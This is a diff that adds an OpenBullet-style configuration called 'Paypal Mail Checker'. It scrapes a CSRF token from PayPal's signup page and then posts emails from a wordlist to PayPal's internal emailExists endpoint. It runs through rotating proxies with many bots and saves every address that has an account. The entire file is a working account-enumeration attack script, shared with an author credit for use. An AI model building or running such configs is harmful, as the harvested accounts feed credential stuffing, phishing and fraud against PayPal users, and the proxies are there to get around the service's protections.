@@ -1,0 +1,84 @@
+[SETTINGS]
+{
+  "Name": "Paypal Mail Checker",
+  "SuggestedBots": 200,
+  "MaxCPM": 0,
+  "LastModified": "2021-05-24T04:36:13.963761+00:00",
+  "AdditionalInfo": "",
+  "Author": "@RafiMuhammadDenielS",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "Default",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://www.paypal.com/in/welcome/signup/" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR "data-csrf-token=\"" "\"" -> VAR "csrf" 
+
+REQUEST POST "https://www.paypal.com/welcome/rest/v1/emailExists" 
+  CONTENT "{\"email\":\"<USER>\"}" 
+  CONTENTTYPE "application/json;charset=UTF-8" 
+  HEADER "Host: www.paypal.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Accept: application/json" 
+  HEADER "DNT: 1" 
+  HEADER "x-csrf-token: <csrf>" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows Lucif3rHun 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36" 
+  HEADER "Origin: https://www.paypal.com" 
+  HEADER "Referer: https://www.paypal.com/in/welcome/signup/" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "\"emailExists\":true" 
+  KEYCHAIN Failure OR 
+    KEY "\"emailExists\":false" 
+
+FUNCTION Constant "True" -> CAP "Valid Mail" 
+
+FUNCTION Constant "@RafiMuhammadDenielS" -> CAP "Config by" 
